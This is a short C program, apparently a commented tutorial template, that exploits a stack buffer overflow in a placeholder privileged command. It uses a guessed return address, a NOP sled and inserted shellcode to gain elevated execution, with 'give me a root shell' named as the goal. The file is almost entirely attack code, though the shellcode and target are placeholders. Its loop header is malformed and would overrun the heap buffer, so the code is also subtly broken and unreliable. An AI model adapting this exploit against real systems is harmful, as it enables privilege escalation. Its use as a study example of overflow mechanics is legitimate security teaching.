#include <stdio.h>
#include <stdlib.h>
#include <string.h>

char shellcode[] = "enter in code to be executed here";

void main(int argc, char *argv[])
{
unsigned int i;                             //this value will have an address close to the buffer
unsigned int *ptr, ret, offset = 270;       //the offset is used to go about 270 addresses back, approximately before the shell code
char *command, *buffer;

command = (char *) malloc(200);             //giving command some memory to work with in the heap and zeroing the memory
bzero(command, 200);                        

strcpy(command, "./NameOfCommand '");       //putting beginning of buffer after the end of command in memory
buffer = command + strlen(command);         //later will be another ' to enclose the buffer

ret = (unsigned int) &i - offset;           //the return (ret) value holds where the code will look to as an integer (return address)


                                            /*
                                            this buffer overflow overflows the return address at the end of a command's stack frame.
                                            where we want to return to is the shell code but there is always stuff that can change the address.
                                            this is where the NOP (no operation performed) sled comes in to give us some wiggle room.
                                            */

for(i=0, i<160; i+=4;)                       //filling 160 character of the buffer with the return address 4 bytes at a time
{
*((unsigned int *)(buffer+i)) = ret;        //makes the buffer+i address treated as a pointer and then dereferenced
}                                           //buffer+i is seen as two integers being added so we need the casting train to treat them as addresses

memset(buffer, 0x90, 60);                   //overwriting the first 60 characters of the addresses with commands that do not do anything
memcpy(buffer+60, shellcode, sizeof(shellcode)-1); //coppying our shell code to the buffer right after our NOP sled

                                            /*
                                            when we put our buffer into our command, it will overwrite the return address of the stack frame.
                                            once the program crashes it will return to our ret address which is the address of I offset to be
                                            within the buffer memory. hoping it will point somewhere within our NOP sled, the code will be ran.
                                            the code will not run while in the NOP sled (the point of having it be a lot of NOP code) but once
                                            it gets to our shell code, it will execute. if this exploits a command that has elevated priveleges
                                            then it will run the code with elevated priveleges, if the shell code says "give me a root shell",
                                            it'll do it
                                            */

strcat(command, "\'");                      //enclosing the buffer in '' so when we run the command it sees our buffer as a valid input
system(command);                            //runs our command with the dangerous input buffer
free(command);                              //freeing our memory like a good little programmer

}